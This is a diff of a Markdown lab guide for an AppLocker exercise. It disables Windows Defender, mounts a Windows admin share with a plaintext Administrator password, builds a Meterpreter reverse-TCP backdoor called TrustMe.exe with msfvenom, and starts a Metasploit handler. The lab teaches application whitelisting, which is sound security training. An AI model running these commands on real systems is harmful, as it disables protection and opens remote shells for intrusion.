@@ -1,77 +1,51 @@
 
 # AppLocker
 
-
 Applocker Instructions:
 
-Let’s see what happens when we do not have AppLocker running.  We will set up a simple backdoor and have it connect back to the Ubuntu system.  Remember, the goal is not to show how we can bypass EDR and Endpoint products.  It is to create a simple backdoor and have it connect back.
+Let’s see what happens when we do not have **AppLocker** running.  We will set up a simple backdoor and have it connect back to the **Ubuntu** system.  Remember, the goal is not to show how we can bypass **EDR** and **Endpoint** products.  It is to create a simple backdoor and have it connect back.
 
-First, let’s disable Defender. Simply run the following from an Administrator PowerShell prompt:
+Before we begin, we need to disable **Defender**. Start by opening an instance of Windows **Powershell**. Do this by clicking on the **Powershell** icon in the taskbar.
+
+![](attachments/OpeningPowershell.png)
+
+Next, run the following command in the **Powershell** terminal:
 
 `Set-MpPreference -DisableRealtimeMonitoring $true`
 
+![](attachments/applocker_disabledefender.png)
+
 This will disable Defender for this session.
 
-If you get angry red errors, that is Ok, it means Defender is not running.
+If you get angry red errors, that is ==**Ok**==, it means **Defender** is not running.
 
-Thankfully, we have a couple of scripts that greatly simplify this process.  Please make sure both your Windows and your Linux systems are running.
+Let’s get started by opening a **Kali** instance.
 
-Let’s get started by opening a Terminal as Administrator
+![](attachments/OpeningKaliInstance.png)
 
-![](attachments/Clipboard_2020-06-12-10-36-44.png)
+Alternatively, you can click on the **Kali** icon in the taskbar.
 
-When you get the User Account Control Prompt, select Yes.
+![](attachments/TaskbarKaliIcon.png)
 
-And, open a Ubuntu command prompt:
+Let's start by getting root access in our terminal.
 
-![](attachments/Clipboard_2020-06-17-08-32-51.png)
+`sudo su -`
 
-####NOTE##### 
+Next, lets run the following command to get our IP address:
 
-If you are having trouble with Windows Terminal, you can simply start each of the three shells, we use by starting them directly from the Windows Start button. 
+`ifconfig`
 
- 
+==**Please note the IP address of Y-O-U-R Ethernet adapter.**==
 
-Simply click the Windows Start button in the lower left of your screen and type: 
+![](attachments/applocker_ifconfig.png)
 
- 
+Please note that my adapter is called **"eth0"** and my IP address is **"10.10.1.117"** Your IP Address and adapter name may be different.
 
-`Powershell` 
+First, we need to run the following command in order to mount our remote system to the correct directory:
 
-or 
+`mount -t cifs //10.10.1.209/c$ /mnt/windows-share -o username=Administrator,password=T@GEq5%r2XJh`
 
-`Ubuntu`
-
-or 
-
-`Command Prompt` 
-
- 
-
-For PowerShell and Command Prompt, please right click on them and select Run As Administrator 
-
-###END NOTE###
-
-On your Linux system, please run the following command:
-
-$`ifconfig`
-
-![](attachments/Clipboard_2020-06-12-12-35-15.png)
-
-Please note the IP address of your Ethernet adapter.  
-
-
-
-Please note that my adaptor is called eth0 and my IP address is 172.26.19.133.   Your IP Address and adapter name may be different.
-
-Please note your IP address for the ADHD Linux system on a piece of paper:
-
-
-
-Now, run the following commands to start a simple backdoor and backdoor listener: 
-
-$ `sudo su -`
-Please note, the adhd password is adhd.
+Run the following commands to start a simple backdoor and backdoor listener: 
 
 `msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 
 -f exe -o /tmp/TrustMe.exe`
@@ -80,19 +54,21 @@ Please note, the adhd password is adhd.
 
 `ls -l TrustMe.exe`
 
-
 `cp ./TrustMe.exe /mnt/c/tools`
 
+Let's start the **Metasploit Handler**.  First, open a new Ubuntu Terminal by clicking the down carrot then selecting Ubuntu-18.04.
 
-Now, let's start the Metasploit Handler.  First, open a new Ubuntu Terminal by clicking the down carrot then selecting Ubuntu-18.04.
+This is what your terminal will look like before getting root.  
+
+==root@DESKTOP-I1T2G01:/tmp#== `msfconsole -q`
 
 Let's become root.
 
 `sudo su -`
 
-root@DESKTOP-I1T2G01:/tmp# `msfconsole -q`
+==msf5== > `use exploit/multi/handler`
 
-msf5 > `use exploit/multi/handler`
+The Metasploit Handler successfully ran if the terminal now starts with "**msf5**"
 
 msf5 exploit(multi/handler) > `set PAYLOAD windows/meterpreter/reverse_tcp`
 
@@ -103,7 +79,6 @@ msf5 exploit(multi/handler) > `set LHOST 172.26.19.133`
 Remember, your IP will be different!
 
 msf5 exploit(multi/handler) > `exploit`
-
 
 It should look like this:
 
